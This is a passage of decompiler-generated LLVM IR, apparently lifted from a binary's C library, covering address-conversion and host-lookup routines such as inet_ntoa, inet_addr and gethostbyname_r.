dec_label_pc_1001dedc:                            ; preds = %dec_label_pc_1001dec8
  %v3_1001dedc = icmp eq i32 %arg2, 0
  %v0_1001dee4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1001dedc, i32 %v0_1001dee4)
  %v0_1001dee8 = load i32, i32* %r5.global-to-local, align 4
  %v2_1001dee8 = inttoptr i32 %arg2 to i32*
  store i32 %v0_1001dee8, i32* %v2_1001dee8, align 4
  ret i32 1

dec_label_pc_1001def0:                            ; preds = %dec_label_pc_1001dea4, %dec_label_pc_1001dec0, %dec_label_pc_1001de50, %dec_label_pc_1001de70, %entry
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_1001ded0, { 1, 0 }
  uselistorder i32 %v1_1001decc, { 1, 0 }
  uselistorder i32 %v2_1001de8c, { 1, 0 }
  uselistorder i32 %v3_1001de80, { 1, 0 }
  uselistorder i32 %v0_1001deb8, { 0, 1, 3, 2 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_1001def0, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_1001de50, { 1, 0 }
}

define i32 @__GI_inet_ntoa_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v1_1001df00 = add i32 %arg2, 15
  store i32 %v1_1001df00, i32* %r4.global-to-local, align 4
  %v2_1001df14 = load i32, i32* %arg1, align 4
  store i32 %v2_1001df14, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1001df1c

dec_label_pc_1001df1c:                            ; preds = %dec_label_pc_1001df40.dec_label_pc_1001df1c_crit_edge, %entry
  %v0_1001df1c = phi i32 [ %v2_1001df14, %entry ], [ %v0_1001df1c.pre, %dec_label_pc_1001df40.dec_label_pc_1001df1c_crit_edge ]
  %v0_1001df608 = phi i32 [ %v1_1001df00, %entry ], [ %v0_1001df40, %dec_label_pc_1001df40.dec_label_pc_1001df1c_crit_edge ]
  %v1_1001df1c = urem i32 %v0_1001df1c, 256
  %v5_1001df24 = inttoptr i32 %v0_1001df608 to i8*
  %v6_1001df24 = call i32 @_uintmaxtostr(i8* %v5_1001df24, i32 0, i32 %v1_1001df1c, i32 -10, i32 0)
  %v0_1001df28 = load i32, i32* @r30, align 4
  %v3_1001df28 = icmp eq i32 %v0_1001df28, 0
  %v0_1001df2c = load i32, i32* @r31, align 4
  %v1_1001df2c = udiv i32 %v0_1001df2c, 256
  store i32 %v1_1001df2c, i32* %r31.global-to-local, align 4
  %v1_1001df30 = add i32 %v6_1001df24, -1
  store i32 %v1_1001df30, i32* %r4.global-to-local, align 4
  br i1 %v3_1001df28, label %dec_label_pc_1001df40, label %dec_label_pc_1001df38

dec_label_pc_1001df38:                            ; preds = %dec_label_pc_1001df1c
  %v3_1001df3c = inttoptr i32 %v0_1001df28 to i8*
  store i8 46, i8* %v3_1001df3c, align 1
  %v0_1001df40.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1001df40

dec_label_pc_1001df40:                            ; preds = %dec_label_pc_1001df1c, %dec_label_pc_1001df38
  %v0_1001df40 = phi i32 [ %v1_1001df30, %dec_label_pc_1001df1c ], [ %v0_1001df40.pre, %dec_label_pc_1001df38 ]
  %v0_1001df44.pre = load i32, i32* @r29, align 4
  %tmp7 = icmp slt i32 %v0_1001df44.pre, 4
  br i1 %tmp7, label %dec_label_pc_1001df40.dec_label_pc_1001df1c_crit_edge, label %dec_label_pc_1001df5c

dec_label_pc_1001df40.dec_label_pc_1001df1c_crit_edge: ; preds = %dec_label_pc_1001df40
  %v0_1001df1c.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1001df1c

dec_label_pc_1001df5c:                            ; preds = %dec_label_pc_1001df40
  %v1_1001df60 = add i32 %v0_1001df40, 1
  ret i32 %v1_1001df60

; uselistorder directives
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_1001df40, { 1, 0 }
}

define i32 @__GI_inet_ntoa(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_1001df88 = load i32, i32* %arg1, align 4
  store i32 %v2_1001df88, i32* %stack_var_-8, align 4
  store i32 268558232, i32* @lr, align 4
  %v3_1001df94 = call i32 @__GI_inet_ntoa_r(i32* nonnull %stack_var_-8, i32 ptrtoint (i32* @global_var_1004d844.1209 to i32))
  ret i32 %v3_1001df94
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_1001dfb0 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268558268, i32* @lr, align 4
  %v2_1001dfb8 = bitcast i32* %stack_var_-24 to i8*
  %v3_1001dfb8 = call i32 @inet_aton(i8* %v2_1001dfb8, i32 %v2_1001dfb0)
  %v3_1001dfbc = icmp eq i32 %v3_1001dfb8, 0
  br i1 %v3_1001dfbc, label %dec_label_pc_1001dfcc, label %dec_label_pc_1001dfc8

dec_label_pc_1001dfc8:                            ; preds = %entry
  %v3_1001dfc8 = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_1001dfcc

dec_label_pc_1001dfcc:                            ; preds = %entry, %dec_label_pc_1001dfc8
  %v0_1001dfd8 = phi i32 [ -1, %entry ], [ %v3_1001dfc8, %dec_label_pc_1001dfc8 ]
  ret i32 %v0_1001dfd8

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1001dfcc, { 1, 0 }
}

define i32 @__GI_gethostbyname(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v0_1001dff0 = call i32 @__GI___h_errno_location()
  %v2_1001e000 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268558360, i32* @lr, align 4
  %v7_1001e014 = call i32 @gethostbyname_r(i32 %arg1, i32* nonnull @global_var_1004da20.1210, i32 ptrtoint (i32* @global_var_1004d854.1211 to i32), i32 460, i32 %v2_1001e000, i32 %v0_1001dff0)
  %v3_1001e01c = load i32, i32* %stack_var_-40, align 4
  ret i32 %v3_1001e01c
}

define i32 @gethostbyname_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg6, i32* @r8, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %tmp18 = call i32 @__decompiler_undefined_function_0()
  %tmp19 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-100 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-116 = alloca i32, align 4
  %v0_1001e034 = load i32, i32* @lr, align 4
  store i32 %v0_1001e034, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r23, align 4
  %v3_1001e03c = icmp eq i32 %arg1, 0
  store i32 0, i32* @r31, align 4
  store i32 %arg5, i32* @r20, align 4
  store i32 %tmp, i32* %r26.global-to-local, align 4
  store i32 %arg3, i32* @r30, align 4
  store i32 %arg4, i32* @r29, align 4
  store i32 %arg6, i32* @r24, align 4
  %v2_1001e05c = inttoptr i32 %arg5 to i32*
  store i32 0, i32* %v2_1001e05c, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  br i1 %v3_1001e03c, label %dec_label_pc_1001e360, label %dec_label_pc_1001e068

dec_label_pc_1001e068:                            ; preds = %entry
  %v0_1001e068 = call i32 @__errno_location()
  store i32 %v0_1001e068, i32* %r3.global-to-local, align 4
  %v1_1001e070 = inttoptr i32 %v0_1001e068 to i32*
  %v2_1001e070 = load i32, i32* %v1_1001e070, align 4
  store i32 %v2_1001e070, i32* @r27, align 4
  %v0_1001e078 = load i32, i32* @r31, align 4
  store i32 %v0_1001e078, i32* %v1_1001e070, align 4
  %v0_1001e07c = load i32, i32* %r26.global-to-local, align 4
  %v0_1001e080 = load i32, i32* @r23, align 4
  store i32 %v0_1001e080, i32* %r3.global-to-local, align 4
  %v0_1001e084 = load i32, i32* @r30, align 4
  %v0_1001e088 = load i32, i32* @r29, align 4
  %v0_1001e08c = load i32, i32* @r20, align 4
  %v0_1001e090 = load i32, i32* @r24, align 4
  store i32 268558488, i32* @lr, align 4
  %v7_1001e094 = call i32 @__get_hosts_byname_r(i32 %v0_1001e080, i32 2, i32 %v0_1001e07c, i32 %v0_1001e084, i32 %v0_1001e088, i32 %v0_1001e08c, i32 %v0_1001e090)
  store i32 %v7_1001e094, i32* %r3.global-to-local, align 4
  %v3_1001e098 = icmp eq i32 %v7_1001e094, 0
  br i1 %v3_1001e098, label %dec_label_pc_1001e360, label %dec_label_pc_1001e0a0

dec_label_pc_1001e0a0:                            ; preds = %dec_label_pc_1001e068
  %v0_1001e0a0 = load i32, i32* @r24, align 4
  %v1_1001e0a0 = inttoptr i32 %v0_1001e0a0 to i32*
  %v2_1001e0a0 = load i32, i32* %v1_1001e0a0, align 4
  store i32 %v2_1001e0a0, i32* %r0.global-to-local, align 4
  %v3_1001e0a4 = icmp eq i32 %v2_1001e0a0, 1
  br i1 %v3_1001e0a4, label %dec_label_pc_1001e0c8, label %dec_label_pc_1001e0ac

dec_label_pc_1001e0ac:                            ; preds = %dec_label_pc_1001e0a0
  %v3_1001e0ac = icmp eq i32 %v2_1001e0a0, 4
  br i1 %v3_1001e0ac, label %dec_label_pc_1001e0c8, label %dec_label_pc_1001e0b4

dec_label_pc_1001e0b4:                            ; preds = %dec_label_pc_1001e0ac
  %v3_1001e0b4 = icmp eq i32 %v2_1001e0a0, -1
  br i1 %v3_1001e0b4, label %dec_label_pc_1001e0bc, label %dec_label_pc_1001e360

dec_label_pc_1001e0bc:                            ; preds = %dec_label_pc_1001e0b4
  %v0_1001e0bc = load i32, i32* @r28, align 4
  %v1_1001e0bc = inttoptr i32 %v0_1001e0bc to i32*
  %v2_1001e0bc = load i32, i32* %v1_1001e0bc, align 4
  store i32 %v2_1001e0bc, i32* %r0.global-to-local, align 4
  %v3_1001e0c0 = icmp eq i32 %v2_1001e0bc, 2
  br i1 %v3_1001e0c0, label %dec_label_pc_1001e0c8, label %dec_label_pc_1001e360

dec_label_pc_1001e0c8:                            ; preds = %dec_label_pc_1001e0bc, %dec_label_pc_1001e0ac, %dec_label_pc_1001e0a0
  %v0_1001e0c8 = load i32, i32* @r30, align 4
  %v1_1001e0c8 = sub i32 0, %v0_1001e0c8
  store i32 %v1_1001e0c8, i32* %r0.global-to-local, align 4
  %v0_1001e0cc = load i32, i32* @r27, align 4
  %v1_1001e0cc = load i32, i32* @r28, align 4
  %v2_1001e0cc = inttoptr i32 %v1_1001e0cc to i32*
  store i32 %v0_1001e0cc, i32* %v2_1001e0cc, align 4
  %v0_1001e0d0 = load i32, i32* %r0.global-to-local, align 4
  %v1_1001e0d0 = urem i32 %v0_1001e0d0, 4
  store i32 %v1_1001e0d0, i32* %r0.global-to-local, align 4
  %v3_1001e0d0 = icmp eq i32 %v1_1001e0d0, 0
  %v0_1001e0e8.pre = load i32, i32* @r29, align 4
  br i1 %v3_1001e0d0, label %dec_label_pc_1001e0e8, label %dec_label_pc_1001e0d8

dec_label_pc_1001e0d8:                            ; preds = %dec_label_pc_1001e0c8
  %v2_1001e0d8 = icmp ult i32 %v0_1001e0e8.pre, %v1_1001e0d0
  br i1 %v2_1001e0d8, label %dec_label_pc_1001e35c, label %dec_label_pc_1001e0e0

dec_label_pc_1001e0e0:                            ; preds = %dec_label_pc_1001e0d8
  %v2_1001e0e0 = sub i32 %v0_1001e0e8.pre, %v1_1001e0d0
  store i32 %v2_1001e0e0, i32* @r29, align 4
  %v0_1001e0e4 = load i32, i32* @r30, align 4
  %v2_1001e0e4 = add i32 %v0_1001e0e4, %v1_1001e0d0
  store i32 %v2_1001e0e4, i32* @r30, align 4
  br label %dec_label_pc_1001e0e8

dec_label_pc_1001e0e8:                            ; preds = %dec_label_pc_1001e0c8, %dec_label_pc_1001e0e0
  %v0_1001e0e8 = phi i32 [ %v2_1001e0e0, %dec_label_pc_1001e0e0 ], [ %v0_1001e0e8.pre, %dec_label_pc_1001e0c8 ]
  store i32 -1, i32* @r19, align 4
  %v1_1001e0f0 = load i32, i32* @r24, align 4
  %v2_1001e0f0 = inttoptr i32 %v1_1001e0f0 to i32*
  store i32 -1, i32* %v2_1001e0f0, align 4
  %tmp29 = icmp ult i32 %v0_1001e0e8, 4
  br i1 %tmp29, label %dec_label_pc_1001e35c, label %dec_label_pc_1001e0f8

dec_label_pc_1001e0f8:                            ; preds = %dec_label_pc_1001e0e8
  %v0_1001e0f8 = load i32, i32* @r29, align 4
  %v1_1001e0f8 = add i32 %v0_1001e0f8, -4
  store i32 %v1_1001e0f8, i32* %r0.global-to-local, align 4
  %tmp30 = icmp ult i32 %v1_1001e0f8, 8
  br i1 %tmp30, label %dec_label_pc_1001e35c, label %dec_label_pc_1001e104

dec_label_pc_1001e104:                            ; preds = %dec_label_pc_1001e0f8
  %v1_1001e104 = add i32 %v0_1001e0f8, -12
  store i32 %v1_1001e104, i32* %r0.global-to-local, align 4
  %v0_1001e108 = load i32, i32* @r30, align 4
  %v1_1001e108 = add i32 %v0_1001e108, 4
  store i32 %v1_1001e108, i32* @r25, align 4
  store i32 0, i32* @r28, align 4
  %v3_1001e114 = inttoptr i32 %v1_1001e108 to i32*
  store i32 %v0_1001e108, i32* %v3_1001e114, align 4
  %v0_1001e118 = load i32, i32* @r28, align 4
  %v1_1001e118 = load i32, i32* @r25, align 4
  %v2_1001e118 = add i32 %v1_1001e118, 4
  %v3_1001e118 = inttoptr i32 %v2_1001e118 to i32*
  store i32 %v0_1001e118, i32* %v3_1001e118, align 4
  %tmp31 = icmp ult i32 %v1_1001e104, 32
  br i1 %tmp31, label %dec_label_pc_1001e35c, label %dec_label_pc_1001e120

dec_label_pc_1001e120:                            ; preds = %dec_label_pc_1001e104
  %v0_1001e120 = load i32, i32* @r29, align 4
  %v1_1001e120 = add i32 %v0_1001e120, -44
  store i32 %v1_1001e120, i32* @r27, align 4
  %tmp32 = icmp ult i32 %v1_1001e120, 256
  br i1 %tmp32, label %dec_label_pc_1001e35c, label %dec_label_pc_1001e12c

dec_label_pc_1001e12c:                            ; preds = %dec_label_pc_1001e120
  %v0_1001e12c = load i32, i32* @r30, align 4
  %v1_1001e12c = add i32 %v0_1001e12c, 44
  store i32 %v1_1001e12c, i32* @r31, align 4
  %v0_1001e130 = load i32, i32* @r23, align 4
  store i32 %v0_1001e130, i32* @r4, align 4
  %v1_1001e138 = add i32 %v0_1001e12c, 12
  store i32 %v1_1001e138, i32* @r21, align 4
  store i32 %v1_1001e12c, i32* %r3.global-to-local, align 4
  store i32 268558660, i32* @lr, align 4
  %v3_1001e140 = call i32 @strncpy(i32 %v1_1001e12c, i32 %v0_1001e130, i32 %v1_1001e120)
  %v0_1001e144 = load i32, i32* @r31, align 4
  %v1_1001e144 = load i32, i32* @r30, align 4
  %v2_1001e144 = add i32 %v1_1001e144, 12
  %v3_1001e144 = inttoptr i32 %v2_1001e144 to i32*
  store i32 %v0_1001e144, i32* %v3_1001e144, align 4
  %v0_1001e148 = load i32, i32* @r28, align 4
  %v1_1001e148 = load i32, i32* @r21, align 4
  %v2_1001e148 = add i32 %v1_1001e148, 4
  %v3_1001e148 = inttoptr i32 %v2_1001e148 to i32*
  store i32 %v0_1001e148, i32* %v3_1001e148, align 4
  %v0_1001e14c = load i32, i32* @r23, align 4
  store i32 %v0_1001e14c, i32* %r3.global-to-local, align 4
  %v0_1001e150 = load i32, i32* @r30, align 4
  store i32 268558680, i32* @lr, align 4
  %v2_1001e154 = inttoptr i32 %v0_1001e14c to i8*
  %v3_1001e154 = call i32 @inet_aton(i8* %v2_1001e154, i32 %v0_1001e150)
  store i32 %v3_1001e154, i32* %r3.global-to-local, align 4
  store i32 %v3_1001e154, i32* @r22, align 4
  %v3_1001e158 = icmp eq i32 %v3_1001e154, 0
  br i1 %v3_1001e158, label %dec_label_pc_1001e18c, label %dec_label_pc_1001e160

dec_label_pc_1001e160:                            ; preds = %dec_label_pc_1001e12c
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1001e168 = load i32, i32* @r26, align 4
  %v2_1001e168 = add i32 %v1_1001e168, 8
  %v3_1001e168 = inttoptr i32 %v2_1001e168 to i32*
  store i32 2, i32* %v3_1001e168, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v0_1001e170 = load i32, i32* @r31, align 4
  %v1_1001e170 = load i32, i32* @r26, align 4
  %v2_1001e170 = inttoptr i32 %v1_1001e170 to i32*
  store i32 %v0_1001e170, i32* %v2_1001e170, align 4
  %v0_1001e174 = load i32, i32* %r0.global-to-local, align 4
  %v1_1001e174 = load i32, i32* @r26, align 4
  %v2_1001e174 = add i32 %v1_1001e174, 12
  %v3_1001e174 = inttoptr i32 %v2_1001e174 to i32*
  store i32 %v0_1001e174, i32* %v3_1001e174, align 4
  %v0_1001e178 = load i32, i32* @r25, align 4
  %v1_1001e178 = load i32, i32* @r26, align 4
  %v2_1001e178 = add i32 %v1_1001e178, 16
  %v3_1001e178 = inttoptr i32 %v2_1001e178 to i32*
  store i32 %v0_1001e178, i32* %v3_1001e178, align 4
  %v0_1001e17c = load i32, i32* @r21, align 4
  %v1_1001e17c = load i32, i32* @r26, align 4
  %v2_1001e17c = add i32 %v1_1001e17c, 4
  %v3_1001e17c = inttoptr i32 %v2_1001e17c to i32*
  store i32 %v0_1001e17c, i32* %v3_1001e17c, align 4
  %v0_1001e180 = load i32, i32* @r26, align 4
  %v1_1001e180 = load i32, i32* @r20, align 4
  %v2_1001e180 = inttoptr i32 %v1_1001e180 to i32*
  store i32 %v0_1001e180, i32* %v2_1001e180, align 4
  %v0_1001e184 = load i32, i32* @r28, align 4
  %v1_1001e184 = load i32, i32* @r24, align 4
  %v2_1001e184 = inttoptr i32 %v1_1001e184 to i32*
  store i32 %v0_1001e184, i32* %v2_1001e184, align 4
  br label %dec_label_pc_1001e360

dec_label_pc_1001e18c:                            ; preds = %dec_label_pc_1001e12c
  store i32 268558740, i32* @lr, align 4
  %v0_1001e190 = call i32 @__open_nameservers()
  %v2_1001e198 = ptrtoint i32* %stack_var_-116 to i32
  store i32 %v2_1001e198, i32* @r28, align 4
  store i32 %v2_1001e198, i32* %r3.global-to-local, align 4
  %v4_1001e1ac = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-116, i32 add (i32 ptrtoint (i32* @global_var_10010000.20 to i32), i32 26856), i32 ptrtoint (i32* @global_var_10045088.1212 to i32))
  store i32 ptrtoint (i32* @global_var_10045088.1212 to i32), i32* %r3.global-to-local, align 4
  store i32 268558776, i32* @lr, align 4
  %v1_1001e1b4 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_10045088.1212 to i32))
  %v3_1001e1bc = load i32, i32* @global_var_1004528c.1213, align 4
  store i32 %v3_1001e1bc, i32* @r29, align 4
  store i32 %v2_1001e198, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 268558796, i32* @lr, align 4
  %v0_1001e1c8 = call i32 @__pthread_cleanup_pop_restore()
  %v0_1001e1d0 = load i32, i32* @r23, align 4
  store i32 %v0_1001e1d0, i32* %r3.global-to-local, align 4
  %v0_1001e1d4 = load i32, i32* @r29, align 4
  %v2_1001e1e0 = ptrtoint i32* %stack_var_-120 to i32
  %v2_1001e1e4 = ptrtoint i32* %stack_var_-100 to i32
  %v0_1001e1e8 = load i32, i32* @r22, align 4
  store i32 268558840, i32* @lr, align 4
  %v6_1001e1f4 = inttoptr i32 %v0_1001e1d0 to i8*
  %v7_1001e1f4 = call i32 @__dns_lookup(i8* %v6_1001e1f4, i32 1, i32 %v0_1001e1d4, i32 ptrtoint (i32* @global_var_1004ef04.1214 to i32), i32 %v2_1001e1e0, i32 %v2_1001e1e4)
  store i32 %v7_1001e1f4, i32* %r3.global-to-local, align 4
  %v1_1001e1f8 = icmp slt i32 %v7_1001e1f4, 0
  br i1 %v1_1001e1f8, label %dec_label_pc_1001e340, label %dec_label_pc_1001e200

dec_label_pc_1001e200:                            ; preds = %dec_label_pc_1001e18c
  store i32 %tmp19, i32* %r11.global-to-local, align 4
  %v1_1001e208 = add i32 %tmp19, 4
  %v2_1001e20c = mul i32 %v0_1001e1e8, %v1_1001e208
  %v1_1001e210 = add i32 %v2_1001e20c, 256
  %v1_1001e214 = load i32, i32* @r27, align 4
  %v3_1001e214 = icmp ugt i32 %v1_1001e210, %v1_1001e214
  br i1 %v3_1001e214, label %dec_label_pc_1001e21c, label %dec_label_pc_1001e238

dec_label_pc_1001e21c:                            ; preds = %dec_label_pc_1001e200
  %v3_1001e21c = load i32, i32* %stack_var_-100, align 4
  store i32 %v3_1001e21c, i32* @r3, align 4
  store i32 268558884, i32* @lr, align 4
  %v0_1001e220 = call i32 @free()
  %v3_1001e224 = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_1001e224, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1001e22c.1215 to i32), i32* @lr, align 4
  %v0_1001e228 = call i32 @free()
  store i32 34, i32* %r3.global-to-local, align 4
  %v0_1001e230 = load i32, i32* @r19, align 4
  %v1_1001e230 = load i32, i32* @r24, align 4
  %v2_1001e230 = inttoptr i32 %v1_1001e230 to i32*
  store i32 %v0_1001e230, i32* %v2_1001e230, align 4
  br label %dec_label_pc_1001e360

dec_label_pc_1001e238:                            ; preds = %dec_label_pc_1001e200
  %v3_1001e238 = icmp eq i32 %v0_1001e1e8, 0
  br i1 %v3_1001e238, label %dec_label_pc_1001e238.dec_label_pc_1001e2dc_crit_edge, label %dec_label_pc_1001e240

dec_label_pc_1001e238.dec_label_pc_1001e2dc_crit_edge: ; preds = %dec_label_pc_1001e238
  %v0_1001e2e4.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1001e2dc

dec_label_pc_1001e240:                            ; preds = %dec_label_pc_1001e238
  %v2_1001e240 = mul i32 %v0_1001e1e8, %tmp19
  store i32 %v2_1001e240, i32* @r5, align 4
  %v0_1001e244 = load i32, i32* @r30, align 4
  %v1_1001e244 = add i32 %v0_1001e244, 36
  store i32 %v1_1001e244, i32* %r3.global-to-local, align 4
  %v0_1001e248 = load i32, i32* @r31, align 4
  store i32 268558928, i32* @lr, align 4
  %v2_1001e24c = call i32 @memmove(i32 %v1_1001e244, i32 %v0_1001e248)
  store i32 %v2_1001e24c, i32* %r3.global-to-local, align 4
  store i32 %v2_1001e240, i32* %r0.global-to-local, align 4
  %v0_1001e25c = load i32, i32* @r30, align 4
  %v1_1001e25c = load i32, i32* @r31, align 4
  %v3_1001e25c = add i32 %v1_1001e25c, %v2_1001e240
  %v4_1001e25c = inttoptr i32 %v3_1001e25c to i32*
  store i32 %v0_1001e25c, i32* %v4_1001e25c, align 4
  %v0_1001e260 = load i32, i32* @r31, align 4
  %v1_1001e260 = load i32, i32* %r0.global-to-local, align 4
  %v2_1001e260 = add i32 %v1_1001e260, %v0_1001e260
  store i32 %v2_1001e260, i32* @r25, align 4
  %v1_1001e268 = add i32 %v0_1001e1e8, -1
  store i32 %v1_1001e268, i32* %r11.global-to-local, align 4
  %v1_1001e26c = add i32 %v0_1001e1e8, 1
  %v2_1001e270 = icmp sgt i32 %v1_1001e268, -1
  store i32 %v1_1001e26c, i32* %ctr.global-to-local, align 4
  br i1 %v2_1001e270, label %dec_label_pc_1001e2a0.preheader, label %dec_label_pc_1001e27c

dec_label_pc_1001e27c:                            ; preds = %dec_label_pc_1001e240
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 1, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1001e2a0.preheader

dec_label_pc_1001e2a0.preheader:                  ; preds = %dec_label_pc_1001e27c, %dec_label_pc_1001e240
  %v0_1001e2a86 = phi i32 [ 1, %dec_label_pc_1001e27c ], [ %v1_1001e26c, %dec_label_pc_1001e240 ]
  %v1_1001e2a03 = mul i32 %v1_1001e268, 4
  store i32 %v1_1001e2a03, i32* %r0.global-to-local, align 4
  %v2_1001e2a45 = add i32 %v2_1001e260, %v1_1001e2a03
  store i32 %v2_1001e2a45, i32* @r10, align 4
  %v1_1001e2a87 = add i32 %v0_1001e2a86, -1
  store i32 %v1_1001e2a87, i32* %ctr.global-to-local, align 4
  %v2_1001e2a88 = icmp eq i32 %v1_1001e2a87, 0
  br i1 %v2_1001e2a88, label %dec_label_pc_1001e2ac, label %dec_label_pc_1001e288

dec_label_pc_1001e288:                            ; preds = %dec_label_pc_1001e2a0.preheader, %dec_label_pc_1001e288.dec_label_pc_1001e288_crit_edge
  %v1_1001e29c = phi i32 [ %v2_1001e2a4, %dec_label_pc_1001e288.dec_label_pc_1001e288_crit_edge ], [ %v2_1001e2a45, %dec_label_pc_1001e2a0.preheader ]
  %v0_1001e294 = phi i32 [ %v0_1001e294.pre, %dec_label_pc_1001e288.dec_label_pc_1001e288_crit_edge ], [ %v0_1001e260, %dec_label_pc_1001e2a0.preheader ]
  %v0_1001e28c = phi i32 [ %v0_1001e2a0, %dec_label_pc_1001e288.dec_label_pc_1001e288_crit_edge ], [ %v1_1001e268, %dec_label_pc_1001e2a0.preheader ]
  %v2_1001e28c = mul i32 %v0_1001e28c, %tmp19
  %v1_1001e290 = add i32 %v0_1001e28c, -1
  store i32 %v1_1001e290, i32* %r11.global-to-local, align 4
  %v2_1001e294 = add i32 %v0_1001e294, -8
  %v1_1001e298 = add i32 %v2_1001e294, %v2_1001e28c
  %v2_1001e29c = add i32 %v1_1001e29c, 4
  %v3_1001e29c = inttoptr i32 %v2_1001e29c to i32*
  store i32 %v1_1001e298, i32* %v3_1001e29c, align 4
  %v0_1001e2a0 = load i32, i32* %r11.global-to-local, align 4
  %v1_1001e2a0 = mul i32 %v0_1001e2a0, 4
  store i32 %v1_1001e2a0, i32* %r0.global-to-local, align 4
  %v1_1001e2a4 = load i32, i32* @r25, align 4
  %v2_1001e2a4 = add i32 %v1_1001e2a4, %v1_1001e2a0
  store i32 %v2_1001e2a4, i32* @r10, align 4
  %v0_1001e2a8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1001e2a8 = add i32 %v0_1001e2a8, -1
  store i32 %v1_1001e2a8, i32* %ctr.global-to-local, align 4
  %v2_1001e2a8 = icmp eq i32 %v1_1001e2a8, 0
  br i1 %v2_1001e2a8, label %dec_label_pc_1001e2ac, label %dec_label_pc_1001e288.dec_label_pc_1001e288_crit_edge

dec_label_pc_1001e288.dec_label_pc_1001e288_crit_edge: ; preds = %dec_label_pc_1001e288
  %v0_1001e294.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1001e288

dec_label_pc_1001e2ac:                            ; preds = %dec_label_pc_1001e288, %dec_label_pc_1001e2a0.preheader
  %v1_1001e2b8 = phi i32 [ %v2_1001e260, %dec_label_pc_1001e2a0.preheader ], [ %v1_1001e2a4, %dec_label_pc_1001e288 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1001e2b4 = mul i32 %v0_1001e1e8, 4
  %v2_1001e2b8 = add i32 %v1_1001e2b4, 4
  %v2_1001e2bc = add i32 %v2_1001e2b8, %v1_1001e2b8
  %v3_1001e2bc = inttoptr i32 %v2_1001e2bc to i32*
  store i32 0, i32* %v3_1001e2bc, align 4
  %v0_1001e2c8 = load i32, i32* @r25, align 4
  %v2_1001e2c8 = add i32 %v0_1001e2c8, %v1_1001e2b4
  store i32 %v2_1001e2c8, i32* %r11.global-to-local, align 4
  %v1_1001e2cc = load i32, i32* @r31, align 4
  %v2_1001e2cc = sub i32 %v1_1001e2cc, %v2_1001e2c8
  %v1_1001e2d0 = add i32 %v2_1001e2c8, 8
  store i32 %v1_1001e2d0, i32* @r31, align 4
  %v0_1001e2d4 = load i32, i32* @r27, align 4
  %v2_1001e2d4 = add i32 %v0_1001e2d4, %v2_1001e2cc
  %v1_1001e2d8 = add i32 %v2_1001e2d4, -8
  store i32 %v1_1001e2d8, i32* @r27, align 4
  br label %dec_label_pc_1001e2dc

dec_label_pc_1001e2dc:                            ; preds = %dec_label_pc_1001e238.dec_label_pc_1001e2dc_crit_edge, %dec_label_pc_1001e2ac
  %v0_1001e2e4 = phi i32 [ %v0_1001e2e4.pre, %dec_label_pc_1001e238.dec_label_pc_1001e2dc_crit_edge ], [ %v1_1001e2d0, %dec_label_pc_1001e2ac ]
  %v0_1001e2e0 = phi i32 [ %v1_1001e214, %dec_label_pc_1001e238.dec_label_pc_1001e2dc_crit_edge ], [ %v1_1001e2d8, %dec_label_pc_1001e2ac ]
  %v3_1001e2dc = load i32, i32* %stack_var_-100, align 4
  store i32 %v3_1001e2dc, i32* @r4, align 4
  store i32 %v0_1001e2e4, i32* %r3.global-to-local, align 4
  store i32 268559084, i32* @lr, align 4
  %v3_1001e2e8 = call i32 @strncpy(i32 %v0_1001e2e4, i32 %v3_1001e2dc, i32 %v0_1001e2e0)
  %v3_1001e2ec = load i32, i32* %stack_var_-100, align 4
  store i32 %v3_1001e2ec, i32* @r3, align 4
  store i32 268559092, i32* @lr, align 4
  %v0_1001e2f0 = call i32 @free()
  store i32 %v0_1001e2f0, i32* %r3.global-to-local, align 4
  store i32 %tmp18, i32* %r0.global-to-local, align 4
  %v3_1001e2f8 = icmp eq i32 %tmp18, 1
  br i1 %v3_1001e2f8, label %dec_label_pc_1001e300, label %dec_label_pc_1001e348

